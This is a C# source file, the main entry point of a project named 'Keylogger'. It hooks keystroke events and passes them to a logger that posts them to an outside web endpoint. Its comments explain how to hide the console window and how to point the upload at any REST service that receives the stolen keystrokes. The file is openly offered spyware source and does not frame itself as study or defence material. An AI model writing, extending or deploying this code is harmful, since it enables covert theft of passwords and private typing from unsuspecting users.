using System;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Keylogger
{
    class Program
    {
        static ManualResetEvent waitHandle = new ManualResetEvent(false);
        static void Main(string[] args)
        {
            //-------------------------------------------------------//

            bool EnableConsoleOutput = true;
            //If you want to become console invisible, go to project -> properties ->
            //application and set output type to windows application

            string URL = @"https://ptsv2.com/t/l0l8k-1585687144/post";
            //You can set link of rest api service, that accepts post requsts.
            //By default, it's free debug service for accepting post request.
            //Results could be seen here: https://ptsv2.com/t/l0l8k-1585687144

            //-------------------------------------------------------//

            Catcher catcher = new Catcher(20);
            Logger logger = new Logger(URL, EnableConsoleOutput);
            catcher.KeyDown += logger.KeyDown;
            catcher.KeyUp += logger.KeyUp;
            catcher.Start();           
            waitHandle.WaitOne();
        }

        
    }
}
